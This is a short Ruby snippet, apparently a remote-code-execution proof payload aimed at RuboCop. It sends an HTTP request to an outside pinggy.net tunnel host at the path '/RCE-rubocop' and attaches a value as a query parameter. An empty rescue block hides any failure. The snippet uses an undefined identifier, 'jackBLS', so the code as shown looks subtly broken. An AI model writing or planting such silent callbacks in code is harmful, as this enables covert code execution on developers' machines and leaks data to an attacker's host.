require 'net/http'
begin
  Net::HTTP.get(URI('https://gfxzy-2601-681-4180-9040-e0f0-4747-a30-e33b.free.pinggy.net/RCE-rubocop?h='+jackBLS.strip))
rescue
end
